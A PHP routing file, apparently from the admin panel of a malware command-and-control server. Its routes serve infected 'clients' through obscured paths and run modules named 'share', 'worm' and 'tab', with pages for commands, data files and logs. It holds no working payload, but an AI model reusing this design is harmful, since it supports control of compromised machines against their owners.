<?php

/**
 * Set the routes. Each route must have a minimum of a name, a URI and a set of
 * defaults for the URI.
 */

Route::set('apiEx', 'du8ASnIODJjksdb89fsibndg7s6giosulDSGsdgsyb78s87dgdsgszklj8zgh8dsgisgsdg/<client>', ['client' => '[A-F0-9]{32}'])
    ->defaults([
        'controller' => 'apiEx',
        'action' => 'index',
    ]);

Route::set('runmodules', 'njsdkln8sD78dshinun675dSA68s7guSBgksbdgodsogifh9gSDgsugvbtG7a67dsg/runmodules/<action>/<client>', [
        'client' => '[A-F0-9]{32}',
        'action' => 'share|worm|tab',
    ])->defaults([
        'controller' => 'apiEx',
        'action' => 'share',
    ]);

Route::set('groups', 'groups/statistics/<name>', ['name' => '[a-f0-9]{100}'])->defaults([
    'directory' => 'Groups',
    'controller' => 'Statistics',
    'action' => 'index',
]);

Route::set('rest', '<directory>/<controller>/<action>(/<page>)', ['directory' => 'rest', 'page' => '[0-9]+'])
    ->defaults([
        'directory' => 'rest',
        'controller' => 'rest_clients',
        'action' => 'index',
    ]);

Route::set('api', '<directory>/<controller>(/<action>(/<id>))', ['directory' => 'api', 'page' => '[0-9]+'])->defaults([
    'directory' => 'Api',
    'controller' => 'Log',
    'action' => 'index',
]);

Route::set('clients', '(page(/<page>))', array(
            'controller' => 'Clients',
            'page' => '[0-9]+'
        ))
        ->defaults(array(
            'controller' => 'clients',
            'action' => 'index',
        ));

Route::set('devhashlookup', 'devhashlookup(/page/<page>)', array(
            'page' => '[0-9]+',
        ))
        ->defaults(array(
            'controller' => 'devhashlookup',
            'action' => 'index',
        ));

Route::set('download', 'download(/<action>(/<id>(/<id_second>)))', [
            'controller' => 'Download',
        ])
        ->defaults(array(
            'controller' => 'download',
            'action' => 'index',
        ));

Route::set('log', 'log/<id>(/page/<page>)', array(
            'controller' => 'Log',
            'page' => '[0-9]+'
        ))
        ->defaults(array(
            'controller' => 'log',
            'action' => 'index',
        ));

Route::set('userslogs', 'userslogs(/<page>)', array(
            'controller' => 'Userslogs',
            'page' => '[0-9]+'
        ))
        ->defaults(array(
            'controller' => 'userslogs',
            'action' => 'index',
        ));

Route::set('commands', 'commands(/<page>)', array(
            'page' => '\d+',
        ))
        ->defaults(array(
            'controller' => 'Commands',
            'action' => 'index',
        ));

Route::set('datafiles', 'datafiles(/<page>)', array(
            'controller' => 'Datafiles',
            'page' => '\d+'
        ))
        ->defaults(array(
            'controller' => 'datafiles',
            'action' => 'index',
        ));

Route::set('crud', 'crud(/<controller>(/<action>(/<id>)))', array('id' => '[\d\w\.\-\_\:]+'))
        ->defaults([
            'directory' => 'CRUD',
            'controller' => 'file',
            'action' => 'index',
        ]);

Route::set('ajax', 'ajax(/<controller>(/<action>(/<id>)))', array('id' => '[\d\w\.\-\_\:]+'))
        ->defaults(array(
            'directory' => 'ajax',
            'controller' => 'log',
            'action' => 'index',
        ));

Route::set('roles', '(<controller>(/<action>(/<id>)))', array('controller' => 'Roles'))
        ->defaults(array(
            'controller' => 'roles',
            'action' => 'index',
        ));

Route::set('profile', 'profile(/<action>(/<id>))')
        ->defaults(array(
            'controller' => 'profile',
            'action' => 'index',
        ));

Route::set('default', '(<controller>(/<action>(/<id>)))')
        ->defaults(array(
            'controller' => 'clients',
            'action' => 'index',
        ));
